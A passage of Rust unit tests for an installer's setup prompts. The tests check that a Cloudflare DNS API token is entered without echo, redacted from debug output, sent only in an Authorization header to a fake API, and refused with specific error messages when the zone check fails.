        assert!(!a.sso.enabled);
    }

    /// One `dbg!(&answers)` away from a leak, before this.
    /// On screen, in scrollback, in a screen-share. Not worth it for the
    /// one credential here that grants DNS-zone-wide control.
    #[test]
    fn the_token_is_asked_for_without_echo() {
        let mut io = Scripted::new(&[
            "saltbox",
            "thesyms.ca",
            "me@thesyms.ca",
            "sonarr",
            "",
            "a@b.co",
            "tokentokentoken1234567890abcdefghijklmno",
            "a",
            "203.0.113.10",
            "n",
        ]);
        let fake = healthy_cloudflare();
        collect(&mut io, &verifying_against(&fake), &mut no_detection()).unwrap();
        assert_eq!(
            io.secret_asks.len(),
            1,
            "the token must use the non-echoing prompt"
        );
        assert!(io.secret_asks[0].contains("Cloudflare"));
    }

    #[test]
    fn the_token_cannot_be_printed_by_debug() {
        let mut io = Scripted::new(&[
            "saltbox",
            "thesyms.ca",
            "me@thesyms.ca",
            "sonarr",
            "",
            "a@b.co",
            "supersecret1234567890abcdefghijklmnopqrs",
            "a",
            "203.0.113.10",
            "n",
        ]);
        let fake = healthy_cloudflare();
        let a = collect(&mut io, &verifying_against(&fake), &mut no_detection()).unwrap();
        let rendered = format!("{a:?}");
        assert!(
            !rendered.contains("supersecret1234567890abcdefghijklmnopqrs"),
            "Debug leaked the token: {rendered}"
        );
        assert!(rendered.contains("<redacted>"), "{rendered}");
        // ...and it is still retrievable where it is genuinely needed.
        assert_eq!(
            a.cloudflare_token.as_ref().map(Secret::expose),
            Some("supersecret1234567890abcdefghijklmnopqrs")
        );
    }

    /// The only credential these tests transmit: the fake's own dummy,
    /// which is well-formed enough to pass the syntactic checks and
    /// self-describing enough that a stray capture is obviously harmless.
    const GOOD_TOKEN: &str = TEST_TOKEN;

    /// A5's happy path, and the proof that the check is a real call rather
    /// than a comment: the fake sees the zone listing, and the token
    /// travels only in the `Authorization` header.
    #[test]
    fn a_token_that_can_see_the_zone_is_accepted_and_actually_checked() {
        let fake = healthy_cloudflare();
        let token = validate_and_verify_cloudflare_token(
            GOOD_TOKEN,
            "thesyms.ca",
            &verifying_against(&fake),
        )
        .expect("a token scoped to the zone is accepted");
        assert_eq!(token.expose(), GOOD_TOKEN);

        let requests = fake.requests();
        assert!(
            !requests.is_empty(),
            "A5 is a Cloudflare call, not a string check -- no request means no verification"
        );
        for request in requests {
            assert_eq!(
                request.header("authorization"),
                Some(format!("Bearer {GOOD_TOKEN}").as_str()),
            );
            assert!(
                !request.path.contains(GOOD_TOKEN) && !request.query.contains(GOOD_TOKEN),
                "the token must never reach a URL"
            );
        }
    }

    /// The first of A5's two call sites, pinned at `collect` rather than at
    /// the function it delegates to.
    ///
    /// Testing `validate_and_verify_cloudflare_token` alone proves the
    /// check works, never that `collect` still runs it -- dropping the
    /// verification here and keeping only the syntactic half leaves every
    /// other test in this module green. Its sibling on the resumed path is
    /// `main.rs`'s `a_resumed_run_refuses_a_token_the_zone_check_rejects`.
    ///
    /// Mutation check: replace this call site's
    /// `validate_and_verify_cloudflare_token` with
    /// `validate_cloudflare_token` and this fails.
    #[test]
    fn the_first_run_refuses_a_token_the_zone_check_rejects() {
        let fake = FakeCloudflare::start();
        fake.script(
            Route::get("/zones"),
            CannedResponse::api_error(9109, "Invalid access token"),
        );
        let mut io = Scripted::new(&[
            "saltbox",
            "thesyms.ca",
            "me@thesyms.ca",
            "sonarr",
            "",
            "a@b.co",
            GOOD_TOKEN,
        ]);

        let err = collect(&mut io, &verifying_against(&fake), &mut no_detection())
            .unwrap_err()
            .to_string();

        assert!(err.contains("9109"), "{err}");
        assert!(err.contains("/run/secrets/acme-dns"), "{err}");
        assert!(
            !fake.requests().is_empty(),
            "the first run must actually ask Cloudflare, not just inspect the string"
        );
    }

    /// D-06. `options.nix` documents `home.example.com` as a base domain,
    /// so the zone is matched by longest suffix. A `GET /zones?name=` would
    /// reject this perfectly good token.
    #[test]
    fn a_base_domain_below_the_zone_apex_is_accepted() {
        let fake = FakeCloudflare::start();
        fake.script(
            Route::get("/zones"),
            CannedResponse::ok(serde_json::json!([{
                "id": "z9",
                "name": "example.com",
                "name_servers": ["amber.ns.cloudflare.com"],
            }])),
        );
        fake.script(
            Route::get("/zones/z9/dns_records"),
            CannedResponse::ok(serde_json::json!([])),
        );

        validate_and_verify_cloudflare_token(
            GOOD_TOKEN,
            "home.example.com",
            &verifying_against(&fake),
        )
        .expect("a token scoped to the apex covers a subdomain base domain");
    }

    /// Failure mode 1 of 4: Cloudflare itself refuses the credential.
    ///
    /// Note the shape -- HTTP 200 with `success: false`, which is how
    /// Cloudflare really answers a permission failure. The remedy is a new
    /// token, so the message says so, and it names where the credential
    /// lives on an installed host in the shape it actually has.
    #[test]
    fn a_credential_cloudflare_rejects_says_to_reissue_it() {
        let fake = FakeCloudflare::start();
        fake.script(
            Route::get("/zones"),
            CannedResponse::api_error(9109, "Invalid access token"),
        );

        let err = validate_and_verify_cloudflare_token(
            GOOD_TOKEN,
            "thesyms.ca",
            &verifying_against(&fake),
        )
        .expect_err("a rejected credential must fail at the prompt")
        .to_string();

        assert!(err.contains("9109"), "{err}");
        assert!(err.contains("Invalid access token"), "{err}");
        assert!(err.contains("Zone:Read + DNS:Edit"), "{err}");
        // D-11(a): the real path, and the real shape. An operator sent to
        // /run/secrets/acme-dns who writes a bare token there has produced
        // a file systemd reads as empty.
        assert!(err.contains("/run/secrets/acme-dns"), "{err}");
        assert!(err.contains("CLOUDFLARE_DNS_API_TOKEN="), "{err}");
        assert!(
            !err.contains(GOOD_TOKEN),
            "the token must never reach an error string"
        );
    }

    /// Failure mode 2 of 4: the credential is fine, the domain is not in
    /// this account. Re-issuing the token would not help, so the message
    /// must not suggest it.
    #[test]
    fn a_domain_no_visible_zone_covers_says_so_rather_than_blaming_the_token() {
        let fake = FakeCloudflare::start();
        fake.script(
            Route::get("/zones"),
            CannedResponse::ok(serde_json::json!([{
                "id": "z1",
                "name": "someone-elses.example",
                "name_servers": ["amber.ns.cloudflare.com"],
            }])),
        );

        let err = validate_and_verify_cloudflare_token(
            GOOD_TOKEN,
            "thesyms.ca",
            &verifying_against(&fake),
        )
        .expect_err("a token that cannot see the domain must fail at the prompt")
        .to_string();

        assert!(err.contains("thesyms.ca"), "{err}");
        assert!(err.contains("no Cloudflare zone"), "{err}");
        assert!(err.contains("Zone Resources"), "{err}");
        assert!(
            err.contains("longest zone name"),
            "the operator needs to know a parent zone would have been accepted: {err}"
        );
    }

    /// Failure mode 3 of 4: the zone is here, the name is served
    /// elsewhere. Cloudflare would accept every write and not one record
    /// would resolve -- the exact silent success R1 exists to end.
    #[test]
    fn a_delegated_base_domain_is_refused_with_the_nameservers_that_really_serve_it() {
        let fake = FakeCloudflare::start();
        fake.script(
            Route::get("/zones"),
            CannedResponse::ok(serde_json::json!([{
                "id": "z1",
                "name": "example.com",
                "name_servers": ["amber.ns.cloudflare.com"],
            }])),
        );
        fake.script(
            Route::get("/zones/z1/dns_records"),
            CannedResponse::ok(serde_json::json!([{
                "id": "r1",
                "name": "home.example.com",
                "type": "NS",
                "content": "ns1.elsewhere.net",
                "proxied": false,
                "comment": null,
            }])),
        );

        let err = validate_and_verify_cloudflare_token(
            GOOD_TOKEN,
            "home.example.com",
            &verifying_against(&fake),
        )
        .expect_err("a delegated domain must fail at the prompt")
        .to_string();

        assert!(err.contains("home.example.com"), "{err}");
        assert!(err.contains("ns1.elsewhere.net"), "{err}");
        assert!(err.contains("resolve nowhere"), "{err}");
        assert!(err.contains("NS"), "{err}");
    }

    /// Failure mode 4 of 4: the check could not run. The token is refused
    /// rather than accepted on trust -- accepting it would restore the very
    /// "install finished, nothing published" outcome A5 removes.
    #[test]
    fn an_unreachable_api_refuses_the_token_rather_than_accepting_it_unchecked() {
        let fake = FakeCloudflare::start();
        fake.script(Route::get("/zones"), CannedResponse::transport_failure());

        let err = validate_and_verify_cloudflare_token(
            GOOD_TOKEN,
            "thesyms.ca",
            &verifying_against(&fake),
        )
        .expect_err("an unchecked token must not be accepted")
        .to_string();

        assert!(err.contains("Could not reach"), "{err}");
        assert!(err.contains("NOT been checked"), "{err}");
        assert!(err.contains("api.cloudflare.com"), "{err}");
    }

    /// A malformed token never becomes a request. Same discipline as the
    /// empty case: the cheapest refusal is the one that costs no call.
    #[test]
    fn a_malformed_token_is_refused_before_any_request_is_made() {
        let fake = healthy_cloudflare();
        let err = validate_and_verify_cloudflare_token(
            "abcdefghij1234567890abcdefghij1234567890%",
            "thesyms.ca",
            &verifying_against(&fake),
        )
        .expect_err("a trailing % cannot go in an HTTP header")
        .to_string();

        assert!(err.contains("Authorization"), "{err}");
        assert!(
            fake.requests().is_empty(),
            "a malformed token must be caught before it is sent anywhere"
        );
    }

    #[test]
    fn the_catalog_list_is_sorted_and_deduplicated() {
        let mut sorted = CATALOG_APPS.to_vec();
        sorted.sort();
        sorted.dedup();
        assert_eq!(CATALOG_APPS, sorted.as_slice(), "keep CATALOG_APPS sorted");
    }
}
